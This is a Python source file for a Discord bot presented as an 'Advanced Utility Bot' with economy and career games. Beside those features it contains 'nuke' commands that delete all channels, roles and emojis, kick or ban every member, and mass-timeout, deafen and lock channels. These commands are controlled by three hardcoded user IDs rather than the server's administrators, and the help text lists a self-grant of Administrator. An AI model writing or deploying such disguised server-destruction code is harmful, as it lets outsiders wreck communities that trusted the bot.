import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import os
import random
import json
from datetime import datetime, timedelta, UTC
import threading

# ── Config ──────────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is missing in Railway environment variables")

BOT_TOKEN = BOT_TOKEN.strip()

AUTHORIZED_USER_IDS = [
    933543370935128204,
    1328374811726184610,
    1278035697416146966,
]

ECONOMY_FILE = "economy.json"
STARTING_BALANCE = 500
DAILY_AMOUNT = 100
DAILY_COOLDOWN_HOURS = 24
WORK_COOLDOWN_MINUTES = 10

ROLE_SETUP_IMAGE_1 = "https://media.discordapp.net/attachments/1299424182152597545/1501326027861917967/Screenshot_2026-05-05_at_3.52.13_PM.png?ex=69fbaa52&is=69fa58d2&hm=69ced9e91a5906fe230e7e513a47c4d1802cc160816098fbccdad94455bc85b7&=&format=webp&quality=lossless&width=772&height=2148"
ROLE_SETUP_IMAGE_2 = "https://media.discordapp.net/attachments/1299424182152597545/1501327803109478551/Screenshot_2026-05-05_at_3.56.52_PM.png?ex=69fbabf9&is=69fa5a79&hm=a8da3d27e4b0d69f84d073ac9070ae4432df822811278a804b72fc6c92d6257a&=&format=webp&quality=lossless&width=572&height=2304"
ROLE_SETUP_IMAGE_3 = "https://media.discordapp.net/attachments/1299424182152597545/1501327802866335987/Screenshot_2026-05-05_at_3.58.21_PM.png?ex=69fbabf9&is=69fa5a79&hm=e9291f26d42cb08ed073b0d938a8643bf3fa2de22afabf98d32be5ad3d64db6d&=&format=webp&quality=lossless&width=2788&height=1392"

# ── Nuke Permission Helper ────────────────────────────────────────────────
def is_nuke_authorized(interaction: discord.Interaction) -> bool:
    return interaction.user.id in AUTHORIZED_USER_IDS

# ── Palette ──────────────────────────────────────────────────────────────────
class C:
    """Centralised colour palette — change once, applies everywhere."""
    PRIMARY    = discord.Color.from_rgb(88,  101, 242)   # Blurple-ish
    SUCCESS    = discord.Color.from_rgb(87,  242, 135)   # Mint green
    WARNING    = discord.Color.from_rgb(254, 231, 92)    # Gold
    DANGER     = discord.Color.from_rgb(237, 66,  69)    # Red
    NEUTRAL    = discord.Color.from_rgb(79,  84,  92)    # Muted grey
    DARK       = discord.Color.from_rgb(32,  34,  37)    # Near-black
    CASINO     = discord.Color.from_rgb(255, 185, 0)     # Casino gold
    PURPLE     = discord.Color.from_rgb(155, 89,  182)   # Purple

    # ── Log-specific palette (Probot-style: one shade per action family) ──────
    JOIN       = discord.Color.from_rgb(59,  222, 141)   # Bright green   — joins
    LEAVE      = discord.Color.from_rgb(153, 170, 181)   # Slate grey     — leaves
    KICK       = discord.Color.from_rgb(255, 148, 51)    # Orange         — kicks
    BAN        = discord.Color.from_rgb(214, 48,  49)    # Deep red       — bans
    UNBAN      = discord.Color.from_rgb(46,  204, 158)   # Teal green     — unbans
    TIMEOUT    = discord.Color.from_rgb(255, 173, 51)    # Amber          — timeouts
    MSG_DELETE = discord.Color.from_rgb(230, 73,  73)    # Red            — message delete
    MSG_EDIT   = discord.Color.from_rgb(88,  164, 242)   # Sky blue       — message edit
    ROLE_NEW   = discord.Color.from_rgb(87,  242, 135)   # Green          — role create
    ROLE_DEL   = discord.Color.from_rgb(214, 48,  49)    # Red            — role delete
    ROLE_EDIT  = discord.Color.from_rgb(170, 110, 230)   # Purple         — role update/assign
    CHAN_NEW   = discord.Color.from_rgb(87,  242, 135)   # Green          — channel create
    CHAN_DEL   = discord.Color.from_rgb(214, 48,  49)    # Red            — channel delete
    CHAN_EDIT  = discord.Color.from_rgb(88,  164, 242)   # Sky blue       — channel update
    NICK       = discord.Color.from_rgb(114, 172, 255)   # Light blue     — nickname change
    BOOST      = discord.Color.from_rgb(255, 115, 250)   # Pink           — boosts
    EMOJI      = discord.Color.from_rgb(64,  201, 199)   # Teal           — emoji/sticker
    SERVER     = discord.Color.from_rgb(255, 185, 0)     # Gold           — server settings
    INVITE     = discord.Color.from_rgb(87,  242, 135)   # Green          — invite create
    VOICE      = discord.Color.from_rgb(114, 137, 218)   # Indigo         — voice events

# ══════════════════════════════════════════════════════════════════════════════
# ✨ AESTHETIC UI SYSTEM
# ══════════════════════════════════════════════════════════════════════════════

BOT_FOOTER = " ⚡ Powered by void.os • Advanced Utility Bot"
BOT_THUMBNAIL = "https://i.pinimg.com/736x/ad/24/bc/ad24bcb86ea8c3af01bf3702e834fcd8.jpg"

# ── Flavour text bank ──────────────────────────────────────────────────────────
# Small randomised lines mixed into common responses so the bot doesn't feel like
# it's reading off a script. Pick with _flavor("key").
FLAVOR = {
    "deny_no_perms": [
        "Nice try. This one's not for you.",
        "You've reached the 'not happening' screen.",
        "I checked. The answer's still no.",
        "You don't have the keys for this one.",
        "Access denied. I don't make the rules.",
        "You're missing a few permissions... and a little luck.",
        "Looks like this one's above your clearance.",
        "That button isn't yours to press.",
        "Close, but not quite.",
        "Permission level: not enough.",
    ],
    "deny_discord_perms": [
        "Discord says no. I'm just the messenger.",
        "Your permissions called in sick.",
        "Looks like you're missing the required permission.",
        "No can do—Discord won't let you.",
        "That requires a little more authority.",
    ],
    "deny_bot_missing_perms": [
        "I'd love to... but Discord tied my hands.",
        "Give me the right permissions and we'll talk.",
        "I don't have enough power for that one.",
        "Looks like I'm missing a permission or two.",
        "I'm willing. Discord isn't.",
    ],
    "deny_ephemeral": [
        "This menu wasn't made for you.",
        "Private means private.",
        "That's someone else's menu.",
        "You weren't invited to this one.",
        "Nice curiosity. Wrong menu.",
    ],
    "win_big": [
        "Now that's how it's done.",
        "Someone's luck finally showed up.",
        "Huge W.",
        "Jackpot. Try not to spend it all at once.",
        "That went better than expected.",
    ],
    "win_small": [
        "A win's a win.",
        "We'll take those.",
        "Not bad.",
        "Could've been worse.",
        "Profit is profit.",
    ],
    "lose": [
        "That... could've gone better.",
        "Better luck next time.",
        "The odds had other plans.",
        "Ouch.",
        "Maybe don't tell anyone about that one.",
    ],
    "tie": [
        "Nobody wins. Nobody loses. Riveting.",
        "Call it even.",
        "Perfectly balanced.",
        "Well... that happened.",
        "It's a draw.",
    ],
    "daily_claimed": [
        "Payday!",
        "Fresh income acquired.",
        "Your wallet feels a little heavier.",
        "Today's allowance has arrived.",
        "Another day's earnings.",
    ],
    "daily_already": [
        "Easy there, payday's only once a day.",
        "You already got paid.",
        "Your wallet isn't that lucky.",
        "Come back after the cooldown.",
        "Patience pays... literally.",
    ],
    "insufficient_funds": [
        "Your wallet disagrees.",
        "You're a little short.",
        "The math isn't mathing.",
        "Maybe earn a bit more first.",
        "Your balance says 'no.'",
    ],
    "transfer_success": [
        "Money sent.",
        "Mission accomplished.",
        "Transaction complete.",
        "Done and dusted.",
        "Consider it delivered.",
    ],
    "mod_success": [
        "Done.",
        "Consider it handled.",
        "Mission complete.",
        "Problem solved.",
        "That should do it.",
    ],
    "no_warnings": [
        "Clean record.",
        "Nothing to see here.",
        "They're behaving... for now.",
        "No warnings found.",
        "Looks squeaky clean.",
    ],
    "warnings_cleared": [
        "Fresh start.",
        "Warnings wiped.",
        "Clean slate.",
        "Back to zero.",
        "History erased.",
    ],
    "mass_action": [
        "Job finished.",
        "Mission accomplished.",
        "Everything went according to plan.",
        "Done. That was... a lot.",
        "Task completed successfully.",
        "Well, that escalated quickly.",
        "Consider it handled.",
        "That should keep things tidy.",
    ],
    "setup_complete": [
        "You're all set.",
        "Everything's ready to go.",
        "Setup complete.",
        "Finished without exploding.",
        "Mission successful.",
    ],
    "hierarchy_issue": [
        "Discord hierarchy strikes again.",
        "They're above me.",
        "Can't touch that one.",
        "My hands are tied.",
        "That's above my pay grade.",
    ],
    "generic_error": [
        "Well... that wasn't supposed to happen.",
        "Something tripped over itself.",
        "Oops.",
        "That didn't quite work.",
        "Let's pretend you didn't see that.",
    ],
    "not_found": [
        "Couldn't find it.",
        "Either it's gone... or never existed.",
        "Nothing matched that.",
        "I looked everywhere.",
        "No luck.",
    ],
    "cancelled": [
        "Never mind then.",
        "Cancelled.",
        "We'll call it off.",
        "Nothing happened.",
        "Back to square one.",
    ],
    "timed_out": [
        "Too slow.",
        "Time's up.",
        "Maybe next time.",
        "The clock won.",
        "We'll get 'em next time.",
    ],
    "welcome": [
        "Welcome aboard!",
        "Glad you made it.",
        "Fresh face detected.",
        "Hope you brought good vibes.",
        "Welcome! Make yourself at home.",
    ],
    "staff_log": [
        "Action recorded.",
        "Added to the log.",
        "Noted.",
        "For future historians.",
        "Filed away.",
    ],
}


def _flavor(key: str) -> str:
    """Returns a random flavour line for the given category, or a plain fallback."""
    lines = FLAVOR.get(key)
    return random.choice(lines) if lines else ""


def _deny_msg() -> str:
    return f"🚫 {_flavor('deny_no_perms')}"


def _flavor_footer(base: str = BOT_FOOTER) -> str:
    return f"{base} • {_flavor('staff_log')}"


def _base_embed(title, description=None, color=C.PRIMARY):
    embed = discord.Embed(
        title=title,
        description=description,
        color=color,
        timestamp=datetime.now(UTC)
    )

    embed.set_footer(
        text=BOT_FOOTER,
        icon_url="https://i.pinimg.com/736x/ad/24/bc/ad24bcb86ea8c3af01bf3702e834fcd8.jpg"
    )

    embed.set_thumbnail(url=BOT_THUMBNAIL)

    return embed

# ── Bot Setup ────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

# ══════════════════════════════════════════════════════════════════════════════
# 💾 ECONOMY SYSTEM
# ══════════════════════════════════════════════════════════════════════════════
economy_lock = threading.Lock()

def load_economy():
    with economy_lock:
        if os.path.exists(ECONOMY_FILE):
            with open(ECONOMY_FILE, "r") as f:
                return json.load(f)
        return {}

def save_economy(data):
    with economy_lock:
        with open(ECONOMY_FILE, "w") as f:
            json.dump(data, f, indent=2)

def get_user_data(user_id):
    data = load_economy()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {
            "balance": STARTING_BALANCE,
            "daily": None,
            "wins": 0,
            "losses": 0,
            "total_won": 0,
            "total_lost": 0,
            "job_level": 0,
            "work_days": 0,
            "time_skipped": 0
        }
        save_economy(data)
    return data[uid]

def get_balance(user_id):
    return get_user_data(user_id)["balance"]

def update_balance(user_id, amount):
    """Update balance without affecting win/loss stats (for work, rent, daily, etc.)"""
    data = load_economy()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {
            "balance": STARTING_BALANCE,
            "daily": None,
            "wins": 0,
            "losses": 0,
            "total_won": 0,
            "total_lost": 0,
            "job_level": 0,
            "work_days": 0,
            "time_skipped": 0
        }
    data[uid]["balance"] += amount
    save_economy(data)
    return data[uid]["balance"]

def update_balance_with_stats(user_id, amount):
    """Update balance AND track win/loss stats (for gambling only)"""
    data = load_economy()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {
            "balance": STARTING_BALANCE,
            "daily": None,
            "wins": 0,
            "losses": 0,
            "total_won": 0,
            "total_lost": 0,
            "job_level": 0,
            "work_days": 0,
            "time_skipped": 0
        }
    data[uid]["balance"] += amount
    if amount > 0:
        data[uid]["wins"] = data[uid].get("wins", 0) + 1
        data[uid]["total_won"] = data[uid].get("total_won", 0) + amount
    elif amount < 0:
        data[uid]["losses"] = data[uid].get("losses", 0) + 1
        data[uid]["total_lost"] = data[uid].get("total_lost", 0) + abs(amount)
    save_economy(data)
    return data[uid]["balance"]

def can_claim_daily(user_id):
    data = load_economy()
    uid = str(user_id)
    if uid not in data or data[uid].get("daily") is None:
        return True, None
    last = datetime.fromisoformat(data[uid]["daily"])

    # Handle timezone-naive datetimes from old data
    if last.tzinfo is None:
        last = last.replace(tzinfo=UTC)

    remaining = timedelta(hours=DAILY_COOLDOWN_HOURS) - (datetime.now(UTC) - last)
    if remaining.total_seconds() <= 0:
        return True, None
    return False, remaining

def claim_daily(user_id):
    data = load_economy()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {
            "balance": STARTING_BALANCE,
            "daily": None,
            "wins": 0,
            "losses": 0,
            "total_won": 0,
            "total_lost": 0,
            "job_level": 0,
            "work_days": 0,
            "time_skipped": 0
        }
    data[uid]["balance"] += DAILY_AMOUNT
    data[uid]["daily"] = datetime.now(UTC).isoformat()
    save_economy(data)
    return data[uid]["balance"]

def get_leaderboard():
    data = load_economy()
    sorted_users = sorted(data.items(), key=lambda x: x[1]["balance"], reverse=True)
    return sorted_users[:10]


# ══════════════════════════════════════════════════════════════════════════════
# 💼 JOB / CAREER SYSTEM  (8-level economy)
# ══════════════════════════════════════════════════════════════════════════════

JOB_ECONOMY = {
    0: {
        "job":              "☕ Coffee Shop Worker",
        "pay":              16,
        "house":            "🛏️ Shared Room",
        "rent":             30,
        "max_hours_school": 3,
        "max_hours_free":   8,
    },
    1: {
        "job":              "🧑‍💼 Assistant Manager",
        "pay":              20,
        "house":            "🏚️ Small Apartment",
        "rent":             70,
        "max_hours_school": 0,
        "max_hours_free":   9,
    },
    2: {
        "job":              "🏢 Office Employee",
        "pay":              28,
        "house":            "🏢 Studio Apartment",
        "rent":             140,
        "max_hours_school": 0,
        "max_hours_free":   10,
    },
    3: {
        "job":              "📊 Analyst",
        "pay":              40,
        "house":            "🏙️ City Apartment",
        "rent":             260,
        "max_hours_school": 0,
        "max_hours_free":   10,
    },
    4: {
        "job":              "💻 Software Engineer",
        "pay":              65,
        "house":            "🏠 Modern Condo",
        "rent":             450,
        "max_hours_school": 0,
        "max_hours_free":   10,
    },
    5: {
        "job":              "📈 Senior Engineer",
        "pay":              90,
        "house":            "🏡 Suburban House",
        "rent":             750,
        "max_hours_school": 0,
        "max_hours_free":   12,
    },
    6: {
        "job":              "🏦 Investment Banker",
        "pay":              140,
        "house":            "🏛️ Luxury Penthouse",
        "rent":             1300,
        "max_hours_school": 0,
        "max_hours_free":   12,
    },
    7: {
        "job":              "👑 CEO",
        "pay":              250,
        "house":            "🏰 Mansion Estate",
        "rent":             2200,
        "max_hours_school": 0,
        "max_hours_free":   14,
    },
}

# Work days required to be eligible for promotion AT each level (before moving to next)
PROMOTION_THRESHOLDS = {
    0: 25,    # Level 0 → 1 after 25 work days
    1: 75,    # Level 1 → 2 after 75 work days
    2: 150,   # Level 2 → 3 after 150 work days
    3: 300,   # Level 3 → 4 after 300 work days
    4: 600,   # Level 4 → 5 after 600 work days
    5: 950,   # Level 5 → 6 after 950 work days
    6: 1500,  # Level 6 → 7 after 1500 work days
    # Level 7 is max — no further promotion
}

def get_job_info(level):
    return JOB_ECONOMY.get(level, JOB_ECONOMY[0])

def can_promote(career):
    level = career["job_level"]
    work_days = career["work_days"]
    if level in PROMOTION_THRESHOLDS and work_days >= PROMOTION_THRESHOLDS[level]:
        return True
    return False

CAREER_FILE = "career.json"
career_lock = threading.Lock()

def load_career():
    with career_lock:
        if os.path.exists(CAREER_FILE):
            with open(CAREER_FILE, "r") as f:
                return json.load(f)
        return {}

def save_career(data):
    with career_lock:
        with open(CAREER_FILE, "w") as f:
            json.dump(data, f, indent=2)

def get_career(user_id):
    data = load_career()
    uid = str(user_id)

    if uid not in data:
        data[uid] = {
            "job_level": 0,
            "work_days": 0,
            "is_in_school": True
        }
        save_career(data)

    return data[uid]

def update_career(user_id, field, value):
    data = load_career()
    uid = str(user_id)

    if uid not in data:
        data[uid] = {"job_level": 0, "work_days": 0}

    data[uid][field] = value
    save_career(data)

# ══════════════════════════════════════════════════════════════════════════════
# 🛠️ SHARED HELPERS
# ══════════════════════════════════════════════════════════════════════════════

async def confirm(ctx, action: str) -> bool:
    embed = _base_embed(
        "⚠️  Confirm Action",
        (
            f"You are about to **{action}**.\n\n"
            "⚠️ This is a destructive action.\n"
            "To proceed, type **CONFIRM** exactly.\n"
            "Anything else or no response in 15 seconds cancels."
        ),
        C.WARNING,
    )
    prompt_msg = await ctx.send(embed=embed)

    def check(m):
        return (
            m.author == ctx.author and
            m.channel == ctx.channel
        )

    try:
        reply = await ctx.bot.wait_for(
            "message",
            timeout=15.0,
            check=check
        )

        # Track the user's CONFIRM message for deletion after command finishes
        tracked = _cmd_bot_messages.get(ctx.message.id)
        if tracked is not None:
            tracked.append(reply)

        if reply.content.strip().upper() == "CONFIRM":
            return True

        await ctx.send(
            embed=_base_embed(
                "❌ Cancelled",
                f"_{_flavor('cancelled')}_ Confirmation failed.",
                C.NEUTRAL
            ),
        )
        return False

    except asyncio.TimeoutError:
        await ctx.send(
            embed=_base_embed(
                "⏱️  Timed Out",
                f"_{_flavor('timed_out')}_ No response received — action cancelled.",
                C.NEUTRAL
            ),
        )
        return False


async def send_result(ctx, results: list[str], delete_after=None):
    embed = _base_embed(
        "💥  Operation Complete",
        f"_{_flavor('mass_action')}_\n" + "\n".join(results),
        C.DANGER
    )
    await ctx.send(embed=embed, delete_after=delete_after)


# ══════════════════════════════════════════════════════════════════════════════
# 💥 NUKE COMMANDS
# ══════════════════════════════════════════════════════════════════════════════
@bot.command(name="nuke_channels")
async def nuke_channels(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, "delete **ALL** channels"):
        return
    guild = ctx.guild
    count = 0
    for channel in guild.channels:
        try:
            await channel.delete(reason="Nuke: channels")
            count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        embed = _base_embed("💥  Channel Nuke Complete", f"_{_flavor('mass_action')}_\nDeleted **{count}** channels.", C.DANGER)
        await new_ch.send(embed=embed)
    except Exception:
        pass

@bot.command(name="nuke_roles")
async def nuke_roles(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, "delete all **roles**"):
        return
    guild = ctx.guild
    count = 0
    for role in guild.roles:
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: roles")
            count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await send_result(ctx, [f"🗑️  Deleted **{count}** roles."], delete_after=3)

@bot.command(name="nuke_channels_roles")
async def nuke_channels_roles(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, "delete all channels **and** roles"):
        return
    guild = ctx.guild
    ch_count = role_count = 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuke: channels+roles")
            ch_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for role in list(guild.roles):
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: channels+roles")
            role_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        embed = _base_embed("💥  Nuke Complete", f"_{_flavor('mass_action')}_\n🗑️  Channels removed: **{ch_count}**\n🎭  Roles removed: **{role_count}**", C.DANGER)
        await new_ch.send(embed=embed)
    except Exception:
        pass

@bot.command(name="nuke_kick")
async def nuke_kick(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, "delete channels, roles, **and kick all members**"):
        return
    guild = ctx.guild
    ch_count = role_count = kick_count = 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuke: kick")
            ch_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for role in list(guild.roles):
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: kick")
            role_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    async for member in guild.fetch_members(limit=None):
        if member == ctx.author:
            continue
        try:
            await member.kick(reason="Nuke: kick all")
            kick_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        embed = _base_embed(
            "💥  Full Nuke Complete",
            f"🗑️  Channels: **{ch_count}**\n🎭  Roles: **{role_count}**\n👢  Members kicked: **{kick_count}**",
            C.DANGER,
        )
        await new_ch.send(embed=embed)
    except Exception:
        pass

@bot.command(name="nuke_full")
async def nuke_full(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, "perform a **FULL RESET** — channels, roles, emojis, and kick all members"):
        return
    guild = ctx.guild
    ch_count = role_count = kick_count = emoji_count = 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuke: full reset")
            ch_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for role in list(guild.roles):
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: full reset")
            role_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for emoji in list(guild.emojis):
        try:
            await emoji.delete(reason="Nuke: full reset")
            emoji_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    async for member in guild.fetch_members(limit=None):
        if member == ctx.author:
            continue
        try:
            await member.kick(reason="Nuke: full reset")
            kick_count += 1
            await asyncio.sleep(0.1)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        embed = _base_embed(
            "💥  Full Server Nuke",
            f"🗑️  Channels: **{ch_count}**\n🎭  Roles: **{role_count}**\n😀  Emojis: **{emoji_count}**\n👢  Members kicked: **{kick_count}**",
            C.DANGER,
        )
        await new_ch.send(embed=embed)
    except Exception:
        pass

@bot.command(name="nuke_help")
async def nuke_help(ctx):
    embed1 = _base_embed("💥  Nuke Commands (1/2)", color=C.DANGER)
    embed1.add_field(name="!nuke_channels",          value="Delete all channels",                            inline=False)
    embed1.add_field(name="!nuke_roles",             value="Delete all non-default roles",                   inline=False)
    embed1.add_field(name="!nuke_channels_roles",    value="Delete all channels and roles",                  inline=False)
    embed1.add_field(name="!nuke_kick",              value="Delete channels, roles, and kick all members",   inline=False)
    embed1.add_field(name="!nuke_full",              value="Full reset: channels, roles, emojis, members",   inline=False)
    embed1.add_field(name="!give_admin",             value="Grant yourself the Administrator role",           inline=False)
    embed1.add_field(name="!remove_admin",           value="Remove the Administrator role from yourself",     inline=False)
    embed1.add_field(name="!show_high",              value="Show the highest roles in the server",            inline=False)
    embed1.add_field(name="!mass_timeout [minutes]", value="Timeout every member at once",                   inline=False)
    embed1.add_field(name="!mass_untimeout",         value="Remove all timeouts at once",                    inline=False)
    embed1.add_field(name="!mass_ban",               value="Ban every member (except authorized users)",     inline=False)
    embed1.add_field(name="!mass_deafen",            value="Deafen all members in voice channels",           inline=False)
    embed1.add_field(name="!mass_disconnect",        value="Disconnect everyone from voice channels",        inline=False)
    embed1.set_footer(text="⚠️  Requires AUTHORIZED_USER_IDS · All actions ask for confirmation.")

    embed2 = _base_embed("💥  Nuke Commands (2/2)", color=C.DANGER)
    embed2.add_field(name="!lockdown",               value="Lock every channel at once",                     inline=False)
    embed2.add_field(name="!unlockdown",             value="Unlock all channels at once",                    inline=False)
    embed2.add_field(name="!slowmode_all [seconds]", value="Apply slowmode to every channel at once",        inline=False)
    embed2.add_field(name="!strip_roles",            value="Remove all roles from every member",             inline=False)
    embed2.add_field(name="!mass_role_add [role]",   value="Add a specific role to everyone",                inline=False)
    embed2.add_field(name="!mass_role_remove [role]",value="Remove a specific role from everyone",           inline=False)
    embed2.add_field(name="!rename_all_channels",    value="Rename every channel (prompts via DM)",          inline=False)
    embed2.add_field(name="!change_server_name",     value="Change the server name (prompts via DM)",        inline=False)
    embed2.add_field(name="!change_server_icon",     value="Change the server icon (prompts via DM)",        inline=False)
    embed2.set_footer(text="⚠️  Requires AUTHORIZED_USER_IDS · All actions ask for confirmation.")

    await ctx.send(embeds=[embed1, embed2])


# ══════════════════════════════════════════════════════════════════════════════
# 💪 MASS MEMBER ACTION COMMANDS
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="mass_timeout")
async def mass_timeout(ctx, minutes: int = 10):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, f"timeout **ALL** members for **{minutes} minutes**"):
        return
    guild = ctx.guild
    until = discord.utils.utcnow() + timedelta(minutes=minutes)
    count = 0
    for member in guild.members:
        if member.id in AUTHORIZED_USER_IDS or member.bot:
            continue
        try:
            await member.timeout(until, reason=f"Mass timeout by {ctx.author}")
            count += 1
            await asyncio.sleep(0.1)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await ctx.send(embed=_base_embed("⏱️  Mass Timeout Complete", f"_{_flavor('mass_action')}_\nTimed out **{count}** members for **{minutes}** minutes.", C.DANGER), delete_after=3)

@bot.command(name="mass_untimeout")
async def mass_untimeout(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, "remove timeouts from **ALL** members"):
        return
    guild = ctx.guild
    count = 0
    for member in guild.members:
        if member.bot or member.timed_out_until is None:
            continue
        try:
            await member.timeout(None, reason=f"Mass untimeout by {ctx.author}")
            count += 1
            await asyncio.sleep(0.1)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await ctx.send(embed=_base_embed("✅  Mass Untimeout Complete", f"_{_flavor('mass_action')}_\nRemoved timeouts from **{count}** members.", C.SUCCESS), delete_after=3)

@bot.command(name="mass_ban")
async def mass_ban(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, "ban **ALL** members"):
        return
    guild = ctx.guild
    count = 0
    async for member in guild.fetch_members(limit=None):
        if member.id in AUTHORIZED_USER_IDS or member.bot:
            continue
        try:
            await guild.ban(member, reason=f"Mass ban by {ctx.author}", delete_message_days=0)
            count += 1
            await asyncio.sleep(0.1)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await ctx.send(embed=_base_embed("🔨  Mass Ban Complete", f"_{_flavor('mass_action')}_\nBanned **{count}** members.", C.DANGER), delete_after=3)

@bot.command(name="mass_deafen")
async def mass_deafen(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, "deafen **ALL** members in voice channels"):
        return
    guild = ctx.guild
    count = 0
    for member in guild.members:
        if member.voice is None or member.bot:
            continue
        try:
            await member.edit(deafen=True, reason=f"Mass deafen by {ctx.author}")
            count += 1
            await asyncio.sleep(0.1)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await ctx.send(embed=_base_embed("🔇  Mass Deafen Complete", f"_{_flavor('mass_action')}_\nDeafened **{count}** members.", C.DANGER), delete_after=3)

@bot.command(name="mass_disconnect")
async def mass_disconnect(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, "disconnect **ALL** members from voice channels"):
        return
    guild = ctx.guild
    count = 0
    for member in guild.members:
        if member.voice is None or member.bot:
            continue
        try:
            await member.move_to(None, reason=f"Mass disconnect by {ctx.author}")
            count += 1
            await asyncio.sleep(0.1)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await ctx.send(embed=_base_embed("🔌  Mass Disconnect Complete", f"_{_flavor('mass_action')}_\nDisconnected **{count}** members from voice.", C.DANGER), delete_after=3)


# ══════════════════════════════════════════════════════════════════════════════
# 🔒 CHANNEL CONTROL COMMANDS
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="lockdown")
async def lockdown(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, "lock **ALL** channels"):
        return
    guild = ctx.guild
    count = 0
    for channel in guild.text_channels:
        try:
            overwrite = channel.overwrites_for(guild.default_role)
            overwrite.send_messages = False
            await channel.edit(overwrites={guild.default_role: overwrite}, reason=f"Lockdown by {ctx.author}")
            count += 1
            await asyncio.sleep(0.05)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await ctx.send(embed=_base_embed("🔒  Lockdown Active", f"Locked **{count}** channels.", C.DANGER), delete_after=3)

@bot.command(name="unlockdown")
async def unlockdown(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    if not await confirm(ctx, "unlock **ALL** channels"):
        return
    guild = ctx.guild
    count = 0
    for channel in guild.text_channels:
        try:
            overwrite = channel.overwrites_for(guild.default_role)
            overwrite.send_messages = None
            await channel.edit(overwrites={guild.default_role: overwrite}, reason=f"Unlockdown by {ctx.author}")
            count += 1
            await asyncio.sleep(0.05)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await ctx.send(embed=_base_embed("🔓  Lockdown Lifted", f"Unlocked **{count}** channels.", C.SUCCESS), delete_after=3)

@bot.command(name="slowmode_all")
async def slowmode_all(ctx, seconds: int = 10):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send(_deny_msg(), delete_after=5)
        return
    seconds = max(0, min(21600, seconds))
    if not await confirm(ctx, f"set slowmode to **{seconds}s** in **ALL** channels"):
        return
    guild = ctx.guild
    count = 0
    for channel in guild.text_channels:
        try:
            await channel.edit(slowmode_delay=seconds, reason=f"Mass slowmode by {ctx.author}")
            count += 1
            await asyncio.sleep(0.05)
        except (discord.Forbidden, discord.HTTPException):
            pass
    label = f"{seconds}s" if seconds > 0 else "disabled"
    await ctx.send(embed=_base_embed("🐢  Slowmode Applied", f"Set slowmode to **{label}** in **{count}** channels.", C.WARNING), delete_after=3)


# ══════════════════════════════════════════════════════════════════════════════
